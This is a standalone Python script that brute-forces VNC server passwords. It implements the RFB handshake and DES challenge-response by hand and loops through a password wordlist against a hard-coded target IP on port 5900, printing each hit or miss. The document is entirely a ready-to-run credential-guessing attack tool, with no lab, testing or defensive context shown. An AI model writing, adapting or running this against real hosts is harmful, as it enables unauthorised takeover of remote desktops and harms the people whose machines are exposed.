import socket
import pyDes
from vncdotool import rfb

def try_vnc_password(ip, port, password):
    try:
        sock = socket.create_connection((ip, port), timeout=3)
        version = sock.recv(12)
        sock.send(version)

        sec_types = sock.recv(1)
        if sec_types == b'\x01':
            sec_type = sock.recv(1)
            if sec_type == b'\x02':
                # classic VNC authentication
                challenge = sock.recv(16)
                response = vnc_encrypt(challenge, password)
                sock.send(response)
                result = sock.recv(4)
                if result == b'\x00\x00\x00\x00':
                    print(f"[+] SUCCESS: Password '{password}' is correct")
                    return True
                else:
                    print(f"[-] Failed: {password}")
        else:
            print("[!] Unsupported security type or no auth required.")
        sock.close()
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def vnc_encrypt(challenge, password):
    key = (password + '\x00' * 8)[:8]  # pad or trim to 8 chars
    key = bytes([int('{:08b}'.format(b)[::-1], 2) for b in key.encode()])
    des = pyDes.des(key, pyDes.ECB, pad=None, padmode=pyDes.PAD_NORMAL)
    return des.encrypt(challenge)

def brute_force_vnc(ip, port, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            if try_vnc_password(ip, port, password):
                break

# Usage
target_ip = '192.168.43.205'
target_port = 5900
wordlist_file = 'passwords.txt'

brute_force_vnc(target_ip, target_port, wordlist_file)

